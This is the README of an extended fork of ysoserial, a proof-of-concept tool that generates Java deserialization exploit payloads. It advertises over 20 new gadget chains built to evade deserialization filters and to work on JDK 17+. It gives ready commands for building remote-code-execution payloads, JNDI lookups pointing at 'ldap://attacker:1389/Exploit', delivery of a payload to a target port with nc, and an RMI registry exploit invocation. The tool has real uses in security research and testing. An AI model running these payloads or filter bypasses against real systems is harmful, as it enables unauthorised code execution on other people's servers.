
# ysoserial (extended)

Fork of [frohoff/ysoserial](https://github.com/frohoff/ysoserial) with **20+ additional gadget chains** from academic papers (JDD, FLASH, GCMiner) and independent research. Focuses on filter-bypass entry points and JDK 17+ compatible sinks.

A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.

![logo](ysoserial.png)

## What's New in `extended`

### Filter-Bypass Entry Points

Standard deserialization filters (JEP 290, custom `ObjectInputFilter`) typically block `HashMap`, `HashSet`, `PriorityQueue`, and `Hashtable`. These new chains use alternative entry classes:

| Entry Class | Chains | Why It Bypasses |
|-------------|--------|-----------------|
| `ConcurrentHashMap` | CC10, CC11, ROME4, Hibernate3, ROMEJndi | Rarely blocked — used extensively in JDK internals |
| `TreeBag` | CB3 | CC4-specific class, not in standard filter lists |
| `LinkedHashSet` | CC12 | Extends HashSet but class-level filters often miss it |
| `TreeSet` | Click2, BeanShell2 | Standard JDK class, never blocked in known filters |
| `BadAttributeValueExpException` | ROME2 | JMX class, not commonly filtered |
| `Hashtable` | ROME3 | Some filters miss this older Map implementation |

### JDK 17+ Compatible (No TemplatesImpl)

These chains work without `--add-opens java.xml` by using JNDI sinks instead of `TemplatesImpl`:

| Chain | Sink | Usage |
|-------|------|-------|
| `CommonsCollectionsJndi` | `InitialContext.doLookup()` | `java -jar ysoserial.jar CommonsCollectionsJndi 'ldap://attacker/Exploit'` |
| `ROMEJndi` | `JdbcRowSetImpl` → JNDI | `java -jar ysoserial.jar ROMEJndi 'ldap://attacker/Exploit'` |
| `CommonsBeanutilsJndi` | `JdbcRowSetImpl` → JNDI | `java -jar ysoserial.jar CommonsBeanutilsJndi 'ldap://attacker/Exploit'` |
| `CommonsBeanutilsJndi2` | `JdbcRowSetImpl` → JNDI | CB + CC4 variant |
| `CommonsBeanutils4` | `JdbcRowSetImpl` → JNDI | CB + PriorityQueue + JNDI sink |
| `CommonsBeanutilsH2` | `JdbcRowSetImpl` → H2 JDBC INIT | RCE via H2 SQL (requires H2 1.x on target) |
| `WildFly1` | `InitialContext.lookup()` | Direct JNDI from `readObject()` — 120 bytes |

### Other New Chains

| Chain | Description |
|-------|-------------|
| `ROME2` | ROME via `BadAttributeValueExpException` + `Unsafe.putObject()` (JDK 17 val field bypass) |
| `ROME3` | ROME via `Hashtable` with manual Entry construction |
| `GroovyGStr` | Groovy `GString` + `LazyMap` — no `AnnotationInvocationHandler` needed |
| `HibernateCK` | Hibernate `CacheKey` entry (Hibernate 4.x only) |
| `VaadinMP` | Vaadin `MethodProperty` → arbitrary getter invocation |
| `SignedObjectWrap` | `SignedObject` wrapper — bypasses first-layer type filters |
| `CommonsBeanutils3` | CB + TreeBag entry — bypasses PriorityQueue AND InvokerTransformer filters |
| `CommonsBeanutils4` | CB + JdbcRowSetImpl JNDI sink — no TemplatesImpl, JDK 17+ compatible |
| `Click2` | Apache Click via TreeSet entry — bypasses PriorityQueue filters |
| `BeanShell2` | BeanShell interpreter via TreeSet entry — bypasses PriorityQueue filters |

## All Payloads (65 total)

```
Payload                Authors                                Dependencies
-------                -------                                ------------
AspectJWeaver          @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2
BeanShell2             @BofeiC                                bsh:2.0b5
Atomikos               @pwntester, @sciccone                  transactions-osgi:4.0.6, jta:1.1
BeanShell1             @pwntester, @cschneider4711            bsh:2.0b5
C3P0                   @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
Ceylon                 @kai_ullrich                           ceylon.language:1.3.3
Click1                 @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0
Click2                 @BofeiC                                click-nodeps:2.3.0, javax.servlet-api:3.1.0
Clojure                @JackOfMostTrades                      clojure:1.8.0
Clojure2               @JackOfMostTrades                      clojure:1.8.0
CommonsBeanutils1      @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1
CommonsBeanutils2      @k4n5ha0                               commons-beanutils:1.9.2
CommonsBeanutils3      @BofeiC                                commons-beanutils:1.9.2, commons-collections4:4.0
CommonsBeanutils4      @BofeiC                                commons-beanutils:1.9.2, commons-collections:3.1
CommonsBeanutilsH2     @BofeiC                                commons-beanutils:1.9.2
CommonsBeanutilsJndi   @frohoff                               commons-beanutils:1.9.2
CommonsBeanutilsJndi2  @BofeiC                                commons-beanutils:1.9.2, commons-collections4:4.0
CommonsCollections1    @frohoff                               commons-collections:3.1
CommonsCollections2    @frohoff                               commons-collections4:4.0
CommonsCollections3    @frohoff                               commons-collections:3.1
CommonsCollections4    @frohoff                               commons-collections4:4.0
CommonsCollections5    @matthias_kaiser, @jasinner            commons-collections:3.1
CommonsCollections6    @matthias_kaiser                       commons-collections:3.1
CommonsCollections7    @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
CommonsCollections8    @navalorenzo                           commons-collections4:4.0
CommonsCollections9    @meizjm3i                              commons-collections:3.2.1
CommonsCollections10   @BofeiC                                commons-collections:3.1
CommonsCollections11   @BofeiC                                commons-collections4:4.0
CommonsCollections12   @BofeiC                                commons-collections:3.1
CommonsCollectionsJndi @BofeiC                                commons-collections:3.1
FileUpload1            @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
Groovy1                @frohoff                               groovy:2.3.9
GroovyGStr             @BofeiC                                groovy:2.4.3
Hibernate1             @mbechler                              hibernate-core:4.3.11.Final
Hibernate2             @mbechler                              hibernate-core:4.3.11.Final
Hibernate3             @BofeiC                                hibernate-core:4.3.11.Final
HibernateCK            @BofeiC                                hibernate-core:4.3.11.Final
JBossInterceptors1     @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final
JRMPClient             @mbechler
JSON1                  @mbechler                              json-lib:2.4, spring-aop:4.1.4, commons-beanutils:1.9.2
JavassistWeld1         @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final
Jdk7u21                @frohoff
Jython1                @pwntester, @cschneider4711            jython-standalone:2.5.2
Jython2                @pwntester, @cschneider4711, @ykoster  jython-standalone:2.5.2
MozillaRhino1          @matthias_kaiser                       js:1.7R2
MozillaRhino2          @_tint0                                js:1.7R2
Myfaces1               @mbechler
Myfaces2               @mbechler
ROME                   @mbechler                              rome:1.0
ROME2                  @mbechler                              rome:1.0
ROME3                  @mbechler                              rome:1.0
ROME4                  @BofeiC                                rome:1.0
ROMEJndi               @BofeiC                                rome:1.0
Scala                  @mbechler                              scala-library:2.12.6
SignedObjectWrap       @BofeiC                                commons-beanutils:1.9.2
Spring1                @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
Spring2                @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE
SpringJta              @zerothoughts, @sciccone               spring-tx:5.1.7.RELEASE, spring-context:5.1.7.RELEASE
Struts2JasperReports   @sciccone                              struts2-core:2.5.20
URLDNS                 @gebl
Vaadin1                @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
VaadinMP               @BofeiC                                vaadin-server:7.7.14, vaadin-shared:7.7.14
Wicket1                @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
WildFly1               @BofeiC                                wildfly-connector:26.0.1.Final
```

## Description

Originally released as part of AppSecCali 2015 Talk
["Marshalling Pickles: how deserializing objects will ruin your day"](
        https://frohoff.github.io/appseccali-marshalling-pickles/)
with gadget chains for Apache Commons Collections (3.x and 4.x), Spring Beans/Core (4.x), and Groovy (2.3.x).
Later updated to include additional gadget chains for
[JRE <= 1.7u21](https://gist.github.com/frohoff/24af7913611f8406eaf3) and several other libraries.

__ysoserial__ is a collection of utilities and property-oriented programming "gadget chains" discovered in common java
libraries that can, under the right conditions, exploit Java applications performing __unsafe deserialization__ of
objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then
serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes
this data, the chain will automatically be invoked and cause the command to be executed on the application host.

It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having
gadgets on the classpath.

## Disclaimer

This software has been created purely for the purposes of academic research and
for the development of effective defensive techniques, and is not intended to be
used to attack systems except where explicitly authorized. Project maintainers
are not responsible or liable for misuse of the software. Use responsibly.

## Usage

```shell
# RCE via TemplatesImpl (classic)
java -jar ysoserial.jar CommonsCollections6 'calc.exe' > payload.bin

# RCE via JNDI (JDK 17+ friendly, no TemplatesImpl)
java -jar ysoserial.jar CommonsCollectionsJndi 'ldap://attacker:1389/Exploit' > payload.bin

# Filter bypass: ConcurrentHashMap entry instead of HashMap/HashSet
java -jar ysoserial.jar CommonsCollections10 'calc.exe' > payload.bin

# Nested wrapper to bypass first-layer type filters
java -jar ysoserial.jar SignedObjectWrap 'calc.exe' > payload.bin
```

### JDK 17+ Note

On JDK 17+, payloads using `TemplatesImpl` require module opens at **generation time**:

```shell
java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
     --add-opens java.base/java.util=ALL-UNNAMED \
     -jar ysoserial.jar ROME 'calc.exe' > payload.bin
```

JNDI-based payloads (`CommonsCollectionsJndi`, `ROMEJndi`, `WildFly1`) do **not** need these flags.

## Examples

```shell
$ java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd
0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
...
0000550: 7672 0012 6a61 7661 2e6c 616e 672e 4f76  vr..java.lang.Ov
0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
0000570: 0078 7071 007e 003a                      .xpq.~.:

$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
$ nc 10.10.10.10 1099 < groovypayload.bin

$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
```

## Building

Requires Java 17+ and Maven 3.x+

```shell
mvn clean package -DskipTests
```

## References

* [JDD (S&P 2024)](https://doi.org/10.1109/SP54263.2024.00188) — Automated gadget chain discovery
* [FLASH (S&P 2024)](https://doi.org/10.1109/SP54263.2024.00189) — Filter-aware chain construction
* [GCMiner (CCS 2023)](https://doi.org/10.1145/3576915.3616620) — Graph-based gadget chain mining
* [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet): info on vulnerabilities, tools, blogs/write-ups, etc.
* [marshalsec](https://github.com/frohoff/marshalsec): similar project for various Java deserialization formats/libraries
* [ysoserial.net](https://github.com/pwntester/ysoserial.net): similar project for .NET deserialization
